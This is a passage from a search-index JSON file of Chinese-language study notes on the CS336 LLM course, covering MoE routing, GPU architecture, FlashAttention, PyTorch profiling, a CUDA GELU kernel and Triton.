size\u4e00\u76f4\u5728\u589e\u957f\uff0c\u73b0\u5728\u4e3b\u6d41\u6a21\u578b\u7684\u91cf\u7ea7\u572810w\u8fd9\u4e2a\u7ea7\u522b</li> <li>dropout and other regularization\uff1a\u5728LLM\u4e0a\u73b0\u5728\u7684\u8d8b\u52bf\u662f\u7528weight decay\uff08\u5bf9\u4e8e\u6a21\u578b\u53c2\u6570\u8fc7\u5927\u63d0\u4f9b\u4e00\u4e2a\u60e9\u7f5a\u9879\uff09\u66ff\u4ee3dropout\uff0c\u6839\u636e\u5b9e\u9a8c\u8868\u660e\uff0cweight decay\u8fd9\u4e2a\u6b63\u5219\u5316\u65b9\u6848\u5176\u5b9e\u548c\u6700\u521d\u7684\u521d\u8877\uff08\u9632\u6b62\u8fc7\u62df\u5408\uff09\u6ca1\u6709\u4ec0\u4e48\u5173\u7cfb\uff0c\u800c\u662f\u4e0eLearning rates\u8c03\u6574\u6280\u672f\u4e00\u8d77\uff0c\u6709\u6548\u63d0\u9ad8\u8bad\u7ec3\u65f6\u7684Loss\u4e0b\u964d</li> </ul> <p>Training Stability</p> <p>\u5f71\u54cd\u8bad\u7ec3\u7a33\u5b9a\u6027\u7684\u4e3b\u8981\u56e0\u7d20\u5f80\u5f80\u5728Softmax\u6a21\u5757\u4e0a\uff0c\u8fd9\u4e2a\u6a21\u5757\u5f88\u5bb9\u6613\u51fa\u73b0\u68af\u5ea6\u7206\u70b8\u7684\u95ee\u9898\u56e0\u6b64\u4e5f\u6709\u5f88\u591a\u89e3\u51b3\u5b83\u7684\u65b9\u6848\uff0c\u6211\u4eec\u5728Self-Attention\u548c\u6700\u540e\u7684Output\u7684\u6a21\u5757\u4e2d\u90fd\u6709Softmax\u6a21\u5757</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/CS336_LLM/CS336%20LLM/#4-moe","title":"4. Moe","text":"<p>Moe\u5df2\u7ecf\u662f\u73b0\u5728\u6700\u5148\u8fdb\u6a21\u578b\u7684\u5171\u540c\u9009\u62e9</p> <p></p> <p>\u73b0\u9636\u6bb5Moe\u53d6\u5f97\u4f18\u52bf\u7684\u53ea\u6709\u5728\u5927\u578b\u9879\u76ee\u4e2d\uff0c\u51e0\u4e4e\u4e00\u5b9a\u662f\u4f60\u9700\u8981\u505a\u5230\u5f20\u91cf\u5e76\u884c\u7684\u65f6\u5019\u624d\u9700\u8981\uff0c\u5982\u679c\u53ea\u662f\u5355\u5361\u8bad\u7ec3\uff0cMoe\u5f80\u5f80\u4e0d\u4f1a\u6709\u66f4\u597d\u7684\u6548\u679c</p> <p>\u5e76\u4e14Moe\u6709\u4e00\u4e2a\u4e25\u91cd\u7684\u95ee\u9898\u662f\u5176Expert\u7684\u8def\u7531\u9009\u62e9\u662f\u4e0d\u53ef\u5fae\u5206\u7684\uff0c\u5176\u5e76\u4e0d\u662f\u4e00\u4e2a\u7b80\u5355\u7684\u77e9\u9635\u4e58\u6cd5\uff0c\u5bf9\u4e8eMoe\u6211\u4eec\u9700\u8981\u641e\u6e05\u695a</p> <ul> <li>Route function</li> <li>Expert size</li> <li>How to optimize the route function</li> </ul> <p>Route Function</p> <p>\u73b0\u9636\u6bb5\u7684\u5927\u578b\u7cfb\u7edf\u90fd\u9009\u62e9\u4e86Token top-k\u8fd9\u4e2a\u8def\u7531\u65b9\u6848\uff0ctop-k\u662f\u6307\uff0c\u5176\u6709\u4e00\u4e2a\u7f51\u7edc\u9488\u5bf9\u6bcf\u4e2atoken\u8fdb\u884c\u8ba1\u7b97\uff0c\u8ba1\u7b97\u51fa\u8fd9\u4e2atoken\u6700\u9002\u5408\u5206\u914d\u5230k\u4e2aexperts\uff0c\u7136\u540e\u5c31\u4f1a\u628atoken\u4f20\u7ed9\u8fd9k\u4e2aexperts\u8fdb\u884c\u8ba1\u7b97\uff0c\u968f\u540e\u8fd9k\u4e2aexperts\u7684\u8f93\u51fa\u4f1a\u88ab\u95e8\u63a7\uff0c\u7136\u540e\u8fdb\u884c\u4e00\u4e9b\u52a0\u6743\u8ba1\u7b97\u5408\u5728\u4e00\u8d77\uff0c\u8fd9\u662f\u6bd4\u8f83\u4e3b\u6d41\u7684\u505a\u6cd5</p> <p></p> <p>\u800c\u4e8b\u5b9e\u4e0a\uff0c\u867d\u7136\u8fd9\u4e9b\u65b9\u6848\u4e0d\u4e3b\u6d41\uff0c\u4f46\u662fHash\u5206\u914d\uff0c\u4e0d\u8003\u8651\u8bed\u4e49\u4fe1\u606f\uff0c\u4e5f\u53ef\u4ee5\u8ba9Moe\u53d1\u6325\u4f5c\u7528\uff0c\u5e76\u4e14\u8003\u8651\u5230Route\u662f\u4e00\u4e2a\u79bb\u6563\u51b3\u7b56\uff0c\u4e5f\u53ef\u4ee5\u8003\u8651\u7528RL\u8fdb\u884c\u4f18\u5316\uff0c\u4f46\u662f\u8fd9\u4e2a\u65b9\u6848Cost\u5f88\u5927\uff0c\u4e5f\u4e0d\u4e3b\u6d41</p> <p>\u4e3a\u4ec0\u4e48\u8bf4RL\u64c5\u957f\u79bb\u6563\u51b3\u7b56\uff0c\u5b9e\u9645\u4e0aRL\u5c06\u79bb\u6563\u51b3\u7b56\u4f18\u5316\u6210\u4e86\u4e00\u4e2a\u53ef\u5fae\u5206\u65b9\u6848\uff0c\u6bd4\u5982Policy base\u7684\u628a\u79bb\u6563\u51b3\u7b56\u6539\u4e3a\u8f93\u51fa\u6982\u7387\u5206\u5e03\uff0c\u53c8\u6216\u8005Value-base\u5c06\u79bb\u6563\u51b3\u7b56\u6539\u4e3a\u4e86Value\u7684\u53d8\u5316 </p> <p>\u8fd9\u4e2aToken top-k\u7684\u65b9\u6848\u548cAttention\u8ba1\u7b97\u5f88\u50cf\uff0c\u5c06\u8f93\u5165\u7684token\u548cexperts\u7684\u8868\u5f81\u5411\u91cf\u8ba1\u7b97\u76f8\u4f3c\u5ea6\uff0c\u83b7\u5f97top-k</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/CS336_LLM/CS336%20LLM/#5-gpu","title":"5. GPU","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/CS336_LLM/CS336%20LLM/#51-gpu-basic","title":"5.1 GPU Basic","text":"<p>\u5728\u89c6\u9891\u5f00\u5934\u63d0\u4f9b\u4e86\u5f88\u591a\u6709\u7528\u8d44\u6e90</p> <p></p> <p>\u572821\u4e16\u7eaa\u521d\u5f00\u59cb\uff0c\u8ba1\u7b97\u673a\u82af\u7247\u5305\u62ecCPUorGPU\u7684\u5355\u7ebf\u7a0b\u6027\u80fd\u5f00\u59cb\u8fbe\u5230\u9971\u548c\uff0c\u4eba\u4eec\u5f00\u59cb\u4eceabsolute speed scaling\u8f6c\u5411parallel scaling</p> <p></p> <p>CPU\u548cGPU\u7684\u7ed3\u6784\u5bf9\u6bd4\uff0cCPU\u4e2d\u6700\u91cd\u8981\u7684\u662fControl Unit\u6765\u5e94\u5bf9\u5927\u91cf\u7684\u5206\u652f\u903b\u8f91\uff0c\u800cGPU\u4e2d\u6700\u91cd\u8981\u7684\u662f\u8ba1\u7b97\u5355\u5143\uff0c\u6765\u5904\u7406\u6d77\u91cf\u7684\u8ba1\u7b97\u903b\u8f91\u3002CPU\u662f\u4e3a\u4e86\u5c3d\u5feb\u5b8c\u6210\u67d0\u4e2a\u4efb\u52a1\uff0c\u800cGPU\u4e0d\u5173\u5fc3\u67d0\u4e2a\u7684\u4efb\u52a1\u7684\u901f\u5ea6\uff0c\u800c\u662f\u5173\u6ce8\u4e00\u4e2a\u6279\u6b21\u4efb\u52a1\u7684\u5b8c\u6210\u65f6\u95f4</p> <p>Computer in GPU</p> <p>GPU\u5185\u90e8\u7ed3\u6784\u6700\u91cd\u8981\u7684\u662fSM\uff08Streaming Multi-processor\uff09\u800cSM\u4e2d\u6709\u5305\u542b\u591a\u4e2aSP\uff08Streaming processor\uff09\uff0c\u5b83\u4eec\u7684\u533a\u522b\u5728\u4e8e\uff0cSM\u5b58\u5728\u63a7\u5236\u5355\u5143\uff0c\u7c7b\u4f3cCPU\uff0c\u53ef\u4ee5\u8fdb\u884c\u4e00\u4e9b\u903b\u8f91\u4e0a\u7684\u5e76\u884c\uff0c\u5176\u53ef\u4ee5\u5355\u72ec\u638c\u63a7\u4e00\u4e2a\u6279\u6b21\u4efb\u52a1\uff1b\u800cSP\u4e0d\u5b58\u5728\u63a7\u5236\u5355\u5143\uff0c\u5b83\u4eec\u53ea\u80fd\u5904\u7406\u4e00\u6837\u7684\u903b\u8f91\uff0c\u505a\u6570\u636e\u5e76\u884c</p> <ul> <li>SM\u662f\u63a7\u5236\u7684\u6700\u5c0f\u5355\u5143</li> <li>SP\u662f\u8ba1\u7b97\u7684\u6700\u5c0f\u5355\u5143</li> </ul> <p></p> <p>Memory in GPU</p> <p>SM\u80fd\u79bbMemory\u8d8a\u8fd1\uff0c\u5176\u8ba1\u7b97\u901f\u5ea6\u4f1a\u8d8a\u5feb</p> <p></p> <ul> <li>L1 Cache \u548c Shared Memory \u5c31\u5728SM\u4e0a</li> <li>L2 Cache \u5728SM\u8fb9\u4e0a</li> <li>Global Memory\u76f8\u5f53\u4e8e\u662f\u5728\u5916\u90e8\uff0cDram\uff0c\u5e38\u8bf4\u7684H100\u768480GB\u5185\u5b58\uff0c\u5c31\u662f\u6307Global Memory</li> </ul> <p>Execution Model of GPU</p> <p>\u4ece\u7c97\u7c92\u5ea6\u5230\u7ec6\u7c92\u5ea6\uff0cGPU\u7684\u6267\u884c\u6a21\u578b\u6709\u4e09\u4e2a\u90e8\u5206\uff0cBlocks, Warps, Threads</p> <ul> <li>Blocks: \u4e00\u4e2aBlock\u4f1a\u88ab\u5206\u914d\u7ed9\u4e00\u4e2aSM\u8fdb\u884c\u5904\u7406</li> <li>Warp\uff1a\u4e00\u6279\u88ab\u6253\u5305\u597d\u7684Threads\uff0c\u6700\u7ec8\u4e22\u7ed9SP\u6267\u884c</li> <li>Threads: Threads\u662f\u4e00\u6279\u6307\u4ee4\uff0c\u6700\u7ec8\u4e22\u7ed9SP\u4e2d\u7684\u8ba1\u7b97\u5355\u5143\u6267\u884c</li> </ul> <p></p> <p>Memory Model of GPU</p> <p>\u6211\u4eec\u6709\u5f88\u591a\u4e0d\u540c\u7684Memory\u53ef\u4f9b\u5199\u5165\uff0c\u4f46\u662f\u8de8Block\u7684Data\u9700\u8981\u5199\u5165Global Memory</p> <p>\u5982\u679c\u6211\u4eec\u7684\u7f16\u5199\u7684\u7a0b\u5e8f\u4e2d\uff0cThread\u53ea\u9700\u8981\u8bbf\u95eeshared memory\uff0c\u90a3\u4e48\u5176\u4f1a\u53d8\u5f97\u975e\u5e38\u5feb\uff0c\u5982\u679c\u5176\u4e0d\u5f97\u4e0d\u8bbf\u95ee\u5927\u91cf\u7684\u5206\u6563\u6570\u636e\uff0c\u5c31\u4f1a\u53d8\u5f97\u5f88\u6162</p> <p></p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/CS336_LLM/CS336%20LLM/#52-making-ml-workloads-fast-on-gpu","title":"5.2 Making ML workloads fast on GPU","text":"<p>Control divergence</p> <p>Thread\u5185\u90e8\u5fc5\u987b\u6267\u884c\u4e00\u6837\u7684\u6307\u4ee4\uff0c\u56e0\u6b64\u6761\u4ef6\u8bed\u53e5\u4f1a\u8feb\u4f7f\u5176\u65e0\u6cd5\u5e76\u884c</p> <p></p> <p>Low precision computation</p> <p>\u5728GPU\u4e2d\u4f7f\u7528\u4f4e\u7cbe\u5ea6\uff0c\u4f1a\u5927\u5927\u5730\u52a0\u901f\u6574\u4e2a\u8fc7\u7a0b\uff0c\u4e0d\u8bba\u662f\u5728\u6267\u884c\u8fd0\u7b97\uff0c\u8fd8\u662f\u5728\u5185\u5b58\u901a\u4fe1\u89d2\u5ea6\u90fd\u662f\u5982\u6b64</p> <p>Operator fusion</p> <p></p> <p>\u5f53\u6211\u4eec\u628a\u5185\u5bb9\u4eceMemory\u8bfb\u5230\u8ba1\u7b97\u5355\u5143\u5730\u65f6\u5019\uff0c\u6700\u597d\u4e00\u6b21\u6027\u628a\u6240\u6709\u64cd\u4f5c\u5e72\u5b8c\uff0c\u518d\u5199\u56de\u53bb\uff0c\u800c\u4e0d\u662f\u4e00\u904d\u4e00\u904d\u5730\u8bfb\u53d6\u66f4\u65b0</p> <p>recomputation</p> <p>\u6fc0\u6d3b\u503c\u4ece\u8ba1\u7b97\uff0c\u5728Large scale playbook\u4e2d\u4e5f\u63d0\u8fc7\uff0c\u8ba1\u7b97\u91cf\u6362\u5185\u5b58</p> <p>Memory coalescing</p> <p>\u8fd9\u4e2a\u6982\u5ff5\u7684\u6838\u5fc3\u5176\u5b9e\u662f\u5c40\u90e8\u6027\u539f\u7406\uff0cGPU\u5728\u8bbf\u95ee\u5168\u5c40\u5185\u5b58\u7684\u65f6\u5019\uff0c\u4e0d\u4f1a\u4e00\u6b21\u6027\u53ea\u83b7\u53d6\u4e00\u4e2a\u5b57\u8282\uff0c\u800c\u662f\u4f1a\u83b7\u53d6\u4e00\u6279\u6b21\u6570\u636e\uff0c\u8fd9\u548c\u6211\u4eec\u5728CPU\u7684memory\u8bbe\u8ba1\u4e2d\u505a\u7684\u5f88\u60f3</p> <p></p> <p>\u76f8\u5bf9\u5e94\u7684\uff0c\u5f53\u6211\u4eec\u5728\u4e00\u4e2awarp\u4e2d\u8fdb\u884c\u8bbf\u5b58\u65f6\u5019\uff0c\u5176\u4e2d\u7684\u8bbf\u5b58\u7ed3\u679c\u90fd\u5728\u4e00\u4e2aBurst section\u4e2d\uff0c\u5f80\u5f80\u4e00\u6b21\u8bbf\u95ee\u5185\u5b58\u5c31\u53ef\u4ee5\u5168\u90e8\u89e3\u51b3\u3002\u503c\u5f97\u6ce8\u610f\u7684\u662f\u4e00\u4e2awarp\u7684\u5185\u5b58\u8bbf\u95ee\u662f\u7edf\u4e00\u5904\u7406\u7684</p> <p>tiling</p> <p></p> <p>\u6211\u4eec\u6700\u597d\u5730\u904d\u5386\u77e9\u9635\u5730\u65b9\u6848\u662f\u6309\u5217\u904d\u5386\uff0c\u6bcf\u4e2athread\u5904\u7406\u4e00\u884c\uff0c\u4f46\u662f\u5728\u77e9\u9635\u4e58\u6cd5\u4e2d\uff0c\u4e0d\u53ef\u907f\u514d\u5730\u6211\u4eec\u5bf9\u67d0\u4e2a\u77e9\u9635\u8981\u6309\u884c\u904d\u5386\uff0c\u5bfc\u81f4M0,0\u88ab\u4e24\u4e2a\u7ebf\u7a0b\u5904\u7406\uff0c\u5bfc\u81f4\u4e86\u4e24\u500d\u5730\u8bfb\u53d6\u884c\u4e3a</p> <p>\u66f4\u597d\u5730\u65b9\u6848\u662f\uff0c\u6839\u636e\u6211\u4eec\u5730\u5171\u4eab\u5185\u5b58\u5730\u5927\u5c0f\uff0c\u628a\u77e9\u9635\u5206\u5757\uff0c\u8bfb\u53d6\uff0c\u5c40\u90e8\u5730\u8ba1\u7b97\u5b8c\uff0c\u5728\u8fd4\u56de</p> <p></p> <p>\u4f46\u662f\u5b9e\u9645\u4e0a\u5730\u60c5\u51b5\u6211\u4eec\u7684\u4e0d\u4ec5\u8981\u8003\u8651shared memory\u5730\u5927\u5c0f\uff0c\u8fd8\u8981\u8003\u8651\u6211\u4eec\u5730\u77e9\u9635\u65e0\u6cd5\u88ab\u5f88\u597d\u7684\u5747\u5206\uff0c\u6bd4\u5982257x257\u7684\u77e9\u9635\uff0c\u5c31\u6bd4\u8f83\u96be\u5212\u5206\u5730\u5747\u5300</p> <p>GPU\u4e2d\u5730\u5904\u7406\u5668\u4e00\u822c\u6700\u9002\u5408\u5904\u7406128\u500d\u6570\u5730\u6570\u636e</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/CS336_LLM/CS336%20LLM/#53-flash-attention","title":"5.3 Flash Attention","text":"<p>\u8ba1\u7b97\u5c42\u9762\u5730\u4e8c\u6b21\u5f00\u9500\uff0c\u800c\u975e\u5185\u5b58\u5c42\u9762\u7684\u4e8c\u6b21\u5f00\u9500</p> <p>FlashAttention 1 \u53ea\u662f\u5bf9KQV\u77e9\u9635\u505a\u4e86\u7b80\u5355\u7684tiling\uff0c\u5206\u5757\u5230SRAM\u4e2d\uff0c\u8fdb\u884c\u7edf\u4e00\u7684\u8ba1\u7b97\uff0c\u51cf\u5c11\u5185\u5b58\u8bfb\u5199</p> <p></p> <p>Flash attention Softmax</p> <p>\u6807\u51c6\u7684Softmax\u7684\u7b97\u6cd5\u65e0\u6cd5\u5e94\u7528tiling\uff0c\u56e0\u4e3a\u5176\u9700\u8981\u5168\u5c40\u64cd\u4f5c\uff0cFlash Attention\u4e2d\u5e94\u7528online softmax\uff0c\u8fdb\u884c\u4e86\u4e00\u4e9b\u6539\u52a8\uff0c\u4f7f\u5176\u53ef\u4ee5\u505a\u5230\u5148\u5c40\u90e8\u8ba1\u7b97\uff0c\u518d\u5f97\u5230\u6700\u7ec8\u7ed3\u679c</p> <p></p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/CS336_LLM/CS336%20LLM/#6-kernels-triton","title":"6. Kernels &amp; Triton","text":"<p>\u4e3a\u4ec0\u4e48\u6211\u4eec\u9700\u8981\u5b9a\u4e49Block\uff0c\u662f\u56e0\u4e3ablock\u5185\u90e8\u6709\u9ad8\u6548\u7684SRAM\uff0c\u6211\u4eec\u5e0c\u671b\u80fd\u591f\u5b9a\u4e49\u4e00\u4e2a\u5185\u5b58\u9ad8\u6548\u7684\u8ba1\u7b97\u6a21\u578b</p> <p>\u7406\u60f3\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u5e0c\u671b\u6211\u4eec\u7684Block\u7684\u6570\u91cf\u80fd\u591f\u88abSM\u7684\u6570\u91cf\u6574\u9664\uff0c\u8fd9\u6837\u5b50\u8ba1\u7b97\u7684\u6548\u7387\u4f1a\u66f4\u9ad8</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/CS336_LLM/CS336%20LLM/#61-benchmarking-and-profiling","title":"6.1 Benchmarking and Profiling","text":"<p>\u8861\u91cf\u4e00\u4e2aGPU\u6267\u884c\u4ee3\u7801\u7684\u65f6\u95f4\uff0c\u8981\u6ce8\u610f\u4e24\u70b9\uff0c\u4e00\u4e2a\u662f\u53bb\u9664\u7f16\u8bd1\u548c\u4ee3\u7801\u8f6c\u79fb\u7684\u65f6\u95f4\uff0c\u56e0\u6b64\u5148\u6267\u884c\u4e00\u6b21\u505a\u4e00\u4e2awarmup\uff0c\u53e6\u4e00\u4e2a\u4fdd\u6301CPU\u548cGPU\u540c\u6b65\uff0c\u8fd9\u4e2a\u662ftorch\u91cc\u9762\u6709\u5b9e\u73b0\u7684</p> <p>Pytorch\u63d0\u4f9b\u7684profiler\u5e93\uff0c\u662f\u4e00\u4e2a\u5f88\u597d\u7684\u6027\u80fd\u5206\u6790\u5de5\u5177\uff0c\u53ef\u4ee5\u628a\u4f60\u7684\u51fd\u6570\u7684\u5177\u4f53\u884c\u4e3a\u548c\u5f00\u9500\u7ed9\u5c55\u73b0\u51fa\u6765</p> <p>\u793a\u4f8b\u4ee3\u7801\u5982\u4e0b</p> <pre><code>import torch\nfrom torch.profiler import ProfilerActivity\nfrom typing import Callable\n\n\ndef profile(description: str, run: Callable, num_warmups: int = 1, with_stack: bool = False):\n    # Warmup\n    for _ in range(num_warmups):\n        run()\n    if torch.cuda.is_available():\n        torch.cuda.synchronize()  # Wait for CUDA threads to finish (important!)\n    # Run the code with the profiler\n    with torch.profiler.profile(\n            activities=[ProfilerActivity.CPU, ProfilerActivity.CUDA],\n            # Output stack trace for visualization\n            with_stack=with_stack,\n            # Needed to export stack trace for visualization\n            experimental_config=torch._C._profiler._ExperimentalConfig(verbose=True)) as prof:\n        run()\n        if torch.cuda.is_available():\n            torch.cuda.synchronize()  # Wait for CUDA threads to finish (important!)\n    # Print out table\n    table = prof.key_averages().table(sort_by=\"cuda_time_total\",\n                                      max_name_column_width=80,\n                                      row_limit=10)\n    #text(f\"## {description}\")\n    #text(table, verbatim=True)\n    # Write stack trace visualization\n    if with_stack:\n        text_path = f\"var/stacks_{description}.txt\"\n        svg_path = f\"var/stacks_{description}.svg\"\n        prof.export_stacks(text_path, \"self_cuda_time_total\")\n    return table\n\n\ncdist_function = lambda x, y: torch.cdist(x, y)\n\ncdist_profile = profile(\n    description=\"cdist\",\n    run=lambda: cdist_function(\n        torch.randn(1000, 128, device=\"cuda\"),\n        torch.randn(1000, 128, device=\"cuda\")),\n    num_warmups=2,\n    with_stack=True\n)\n\nprint(cdist_profile)\n</code></pre> <p>\u4e0a\u8ff0\u5185\u5bb9\u6d4b\u8bd5\u4e86\u4e00\u4e2atorch.cdist\u51fd\u6570\uff0c\u8be5\u51fd\u6570\u7528\u4e8e\u8ba1\u7b97\u4e24\u4e2a\u5411\u91cf\u4e4b\u95f4\u7684\u6b27\u5f0f\u8ddd\u79bb</p> <p>profile\u7684\u8f93\u51fa\u5982\u4e0b</p> Name Self CPU % Self CPU CPU total % CPU total CPU time avg Self CUDA Self CUDA % CUDA total CUDA time avg # of Calls aten::cdist 1.07% 32.720us 17.57% 537.666us 537.666us 0.000us 0.00% 41.313us 41.313us 1 aten::_euclidean_dist 1.66% 50.863us 15.26% 467.031us 467.031us 0.000us 0.00% 41.313us 41.313us 1 aten::matmul 0.17% 5.202us 3.34% 102.330us 102.330us 0.000us 0.00% 19.680us 19.680us 1 aten::mm 2.43% 74.400us 3.17% 97.128us 97.128us 19.680us 41.64% 19.680us 19.680us 1 ampere_sgemm_32x128_tn 0.00% 0.000us 0.00% 0.000us 0.000us 19.680us 41.64% 19.680us 19.680us 1 aten::randn 1.05% 32.037us 82.03% 2.510ms 1.255ms 0.000us 0.00% 5.952us 2.976us 2 aten::normal_ 1.45% 44.262us 3.32% 101.587us 50.793us 5.952us 12.59% 5.952us 2.976us 2 void at::native::(anonymous namespace)::distribution_elementwise_grid_stride_... 0.00% 0.000us 0.00% 0.000us 0.000us 5.952us 12.59% 5.952us 2.976us 2 aten::cat 1.12% 34.355us 1.63% 49.846us 24.923us 5.089us 10.77% 5.089us 2.544us 2 void at::native::(anonymous namespace)::CatArrayBatchedCopy_aligned16_contig&lt;... 0.00% 0.000us 0.00% 0.000us 0.000us 5.089us 10.77% 5.089us 2.544us 2 <p>Summary - Self CPU time total: 3.060ms - Self CUDA time total: 47.265us</p> <p>\u4e0a\u8ff0\u5185\u5bb9\u66f4\u9002\u5408\u505a\u4e00\u4e9b\u9759\u6001\u7684\u5185\u5bb9\u5206\u6790\uff0c\u800c\u5bf9\u4e8e\u52a8\u6001\u7684\uff0c\u590d\u6742\u7684\u9879\u76ee\uff0c\u5355\u7eaf\u7684profile\u5176\u5b9e\u5e76\u4e0d\u80fd\u76f4\u63a5\u89e3\u51b3\u6389\u76d1\u63a7\u7684\u95ee\u9898</p> <p>\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7nvtx\u6253\u5370\u67e5\u770b\u70b9\uff0c\u7136\u540e\u518d\u66f4\u5f3a\u5927\u7684profiler\u91cc\u8fdb\u884c\u67e5\u770b</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/CS336_LLM/CS336%20LLM/#62-kernel","title":"6.2 Kernel","text":"<p>\u4ee5\u4e00\u4e2a\u624b\u5199\u7684torch\u7684GELU\u4e3a\u4f8b\u5b50</p> <pre><code>def manual_gelu(x: torch.Tensor):\n    return 0.5*x*(1+torch.tanh(0.79788456*(x+0.44715*x*x*x)))\n</code></pre> <p>\u4e0a\u8ff0\u662f\u901a\u8fc7\u4e00\u4e2a\u6570\u5b66\u7684trick\u6765\u5b9e\u73b0\u4e00\u4e2a\u8fd1\u4f3c\u7684gelu\u7684\uff0c\u800c\u5b98\u65b9\u7684gelu</p> <pre><code>def pytorch_gelu(x: torch.Tensor):\n    return torch.nn.functional.gelu(x, approximate=\"tanh\")\n</code></pre> <p>\u5bf9\u6bd4\u53d1\u73b0\u53cc\u65b9\u867d\u7136\u6570\u503c\u7ed3\u679c\u76f8\u540c\uff0c\u4f46\u662f\u8017\u65f6\u5dee\u8ddd\u5de8\u5927</p> <p>\u901a\u8fc7profile\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\uff0c\u4e24\u4e2a\u64cd\u4f5c\uff0cmanual\u7684\u7248\u672c\u542f\u52a8\u4e86\u591a\u4e2acuda kernel\uff0c\u5305\u62ec\u52a0\u6cd5\uff0c\u4e58\u6cd5\uff0ctanh\uff0c\u4f46\u662fgelu\u7248\u672c\u53ea\u542f\u52a8\u4e86\u4e00\u4e2akernel\uff0cgelu kernel\u5b8c\u6210\u4e86\u6240\u6709\u64cd\u4f5c</p> <p>\u56e0\u6b64\u6211\u4eec\u5c1d\u8bd5\u624b\u5199cuda\u5185\u6838</p> <pre><code>#include &lt;math.h&gt;\n#include &lt;torch/extension.h&gt;\n#include &lt;c10/cuda/CUDAException.h&gt;\n\n// Helper function to compute ceil(a / b)\ninline unsigned int cdiv(unsigned int a, unsigned int b) {\n    return (a + b - 1) / b;\n}\n\n// The CUDA kernel that applies the GeLU activation function\n__global__ void gelu_kernel(float* in, float* out, int num_elements) {\n    // Calculate the global index for the current thread\n    int i = blockIdx.x * blockDim.x + threadIdx.x;\n\n    // Check bounds to prevent accessing memory outside the tensor\n    if (i &lt; num_elements) {\n        // GeLU approximation: 0.5 * x * (1 + tanh(sqrt(2/pi) * (x + 0.044715 * x^3)))\n        // 0.79788456 is sqrt(2/pi)\n        out[i] = 0.5 * in[i] * (1.0 + tanh(0.79788456f * (in[i] + 0.044715f * in[i] * in[i] * in[i])));\n    }\n}\n\n// The C++ wrapper function to launch the CUDA kernel\ntorch::Tensor gelu(torch::Tensor x) {\n    TORCH_CHECK(x.device().is_cuda(), \"Input must be a CUDA tensor.\");\n    TORCH_CHECK(x.is_contiguous(), \"Input must be contiguous.\");\n\n    // Allocate the output tensor on the same device\n    torch::Tensor y = torch::empty_like(x);\n\n    // Determine launch configuration\n    int num_elements = x.numel();\n    int block_size = 1024;  // Standard threads per block\n    int num_blocks = cdiv(num_elements, block_size);\n\n    // Launch the kernel\n    gelu_kernel&lt;&lt;&lt;num_blocks, block_size&gt;&gt;&gt;(\n        x.data_ptr&lt;float&gt;(), \n        y.data_ptr&lt;float&gt;(), \n        num_elements\n    );\n\n    // Check for potential CUDA errors after kernel launch\n    C10_CUDA_KERNEL_LAUNCH_CHECK();\n\n    return y;\n}\n</code></pre> <p>\u5bf9\u4e8e\u4e00\u7cfb\u5217\u7684\u7b80\u5355cuda kernel\uff0c\u5176\u5f80\u5f80\u4f1a\u62db\u81f4\u591a\u6b21\u7684\u5185\u5b58\u8bfb\u5199\uff0c\u5c06\u5176\u878d\u5408\u6210\u4e00\u4e2a\u5927\u7684\u590d\u6742\u7b97\u5b50\uff0c\u6548\u7387\u5c31\u4f1a\u9ad8\u5f88\u591a\uff0c\u8fd9\u4e5f\u5c31\u662f\u6240\u8c13\u7684\u7b97\u5b50\u878d\u5408\u7684\u6982\u5ff5</p> <p>cuda kernel\u7684\u4ee3\u7801\u4e00\u822c\u5305\u542b\u4e24\u90e8\u5206\u7684\u5185\u5bb9\uff0c\u4e00\u90e8\u5206\u662f\u5b9e\u9645\u7684cuda kernel\u8ba1\u7b97\u7684\u4ee3\u7801\uff0c\u53e6\u4e00\u90e8\u5206\u662f\u5bf9\u8fd9\u4e2akernel\u7684\u5305\u88c5C++ wrapper\uff0c\u914d\u7f6eblock size\u7136\u540e\u5b9a\u4e49block\u5185\u6570\u636e\u7684\u6570\u91cf</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/CS336_LLM/CS336%20LLM/#63-triton-kernel","title":"6.3 Triton Kernel","text":"<p>Triton\u662fOpenAI\u5f00\u53d1\u7684\u4e00\u79cd\u65b9\u5f0f\uff0c\u7f16\u5199cuda\u975e\u5e38\u7684\u590d\u6742\u5e76\u4e14\u96be\u4ee5\u8c03\u8bd5\uff0c\u80fd\u5426\u7528\u4e00\u4e2a\u66f4\u52a0high level\u7684\u57fa\u4e8epython\u7684\u5f62\u5f0f\u7f16\u5199\u5185\u6838\uff0c\u8fd9\u65e2\u662fTriton\u4e3a\u6211\u4eec\u5e26\u6765\u7684</p> <p>\u5176\u4f7f\u5f97\u6211\u4eec\u4e0d\u7528\u5173\u5fc3\u7ebf\u7a0b\u8fd9\u4e2a\u5c42\u6b21\uff0c\u800c\u662f\u66f4\u5173\u5fc3SM\u8fd9\u4e2a\u5c42\u6b21\uff0c\u7ebf\u7a0b\u5757\u7684\u5c42\u9762</p> 